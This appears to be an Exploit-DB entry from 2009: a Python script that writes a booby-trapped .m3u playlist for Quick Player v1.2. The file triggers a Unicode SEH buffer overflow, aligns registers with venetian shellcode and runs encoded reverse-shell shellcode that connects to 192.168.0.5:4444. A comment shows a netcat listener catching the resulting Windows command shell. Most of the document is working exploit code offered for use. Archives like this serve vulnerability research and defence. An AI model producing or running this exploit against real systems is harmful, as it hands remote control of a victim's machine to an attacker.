# Title: Quick Player v1.2 Unicode Buffer Overflow Exploit
# EDB-ID: 10797
# CVE-ID: ()
# OSVDB-ID: ()
# Author: mr_me
# Published: 2009-12-30
# Verified: yes
# Download Exploit Code
# Download Vulnerable app

view source
print?
#!/usr/bin/python
#
# Vulnerability : Quick Player v1.2 unicode buffer overflow exploit
# coded by  : mr_me
# reference : http://www.exploit-db.com/exploits/10759 (corelanc0d3r)
# Tested on : XP SP3 En (VirtualBox)
# Greetz to : Corelan Security Team::corelanc0d3r/EdiStrosar/Rick2600/MarkoT
#
# mrme@backtrack:~$ nc -lvp 4444
# listening on [any] 4444 ...
# 192.168.0.4: inverse host lookup failed: Unknown server error : Connection timed out
# connect to [192.168.0.5] from (UNKNOWN) [192.168.0.4] 1144
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
#
# C:\>
#
# Note: We don't need a header. Enjoy :)
 
print "|------------------------------------------------------------------|"
print "|                         __               __                   |"
print "|   _________  ________  / /___ _____     / /____  ____ _____ ___  |"
print "|  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |"
print "| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |"
print "| \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |"
print "|-------------------------------------------------- EIP Hunters ---|"
print "[+] Quick Player v1.2 unicode buffer overflow exploit"
 
junk = "\x41" * 536;        # buffer offset
nseh = "\x41\x6d";      # bytes not affecting stack
seh = "\x41\x4d";       # pop pop ret (unicode)
popeax = "\x58";        # pop eax (current addr = 0x0012E270)
fill = "\x6d";          # venetian shellcode
addeax = "\x05\x03\x01";    # add eax, 1000300
filler = "\x6d";            # venetian shellcode
subeax = "\x2d\x01\x01"     # sub eax, 1000100 (eax is now + 200)
morefiller = "\x6d";        # venetian shellcode
pusheax = "\x50";       # setup stack for shellcode
evenmorefiller = "\x6d";    # venetian shellcode
retn = "\xc3";          # retn to the stack and execute shell
morejunk = "\x44" * 239;    # extra 200 bytes and 39 for address alignment
 
# reverse shell (192.168.0.5:4444)
 
reverseshell = ("PPYAIAIAIAIAQATAXAZAPA3QADAZ"
"ABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA"
"58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABA"
"B30APB944JBKLQZZKPM9XJYKOKOKOC0DK2LMTO4TKOUOL"
"TKSLKURXKQZOTKPOLXDK1OMPKQJKQ9TKODTKKQJNP1Y0V"
"9FLSTWP2TKW7QXJLMKQWRJKL4OK0TMTMX2UIUTK1OO4KQ"
"ZKQVTKLLPK4K1OMLM1ZKLCNL4KU9RLO4MLQQGSNQYKS44"
"KOSNPTKOPLLTKRPMLFMDK10M81N2H4NPNLNZLPPKO9FQV"
"PSQVRHP3NRQXD73CNRQOPTKO8PRHXKJMKLOKPPKOHV1OS"
"YK5QVU1JMM8KRPU2JKRKOXPRH8YLIKEFMPWKOJ6QC0SR3"
"QCOSPS0C1CKO8PRHWPW8KPM5QVRHLQQL36R359YQTUBHJ"
"LZYEZQPPWKOIFRJLPPQQEKOXP36RJQTS62H332M1ZB01I"
"MY8LSYYWRJOT599RNQY0ZSFJF53YKMKN12NMKNQ2NLTM2"
"ZNXVKFKVKQXRRKN7CMFKO2UMXKO9FQK271B21PQ21BJKQ"
"PQB1QE0QKOXPQX6MHYKUHNB3KOYFQZKOKONWKOXPQXYW2"
"YI6T9KOSEM4KO9FKOBWKLKOZ02HL0SZLDQOR3KOZ6KOXP"
"LJA");
 
muhahaha = junk + nseh + seh + popeax + fill + addeax + filler;
muhahaha += subeax + morefiller + pusheax + evenmorefiller + retn;
muhahaha += morejunk + reverseshell;
 
try:
    exploit = open('playme_in_quickplayer.m3u','w');
    exploit.write(muhahaha);
    print "[+] Generating playme_in_quickplayer.m3u"
    print "[+] Done!"
    exploit.close();
except:
    print "[-] Cannot generate exploit file.. check your privileges"

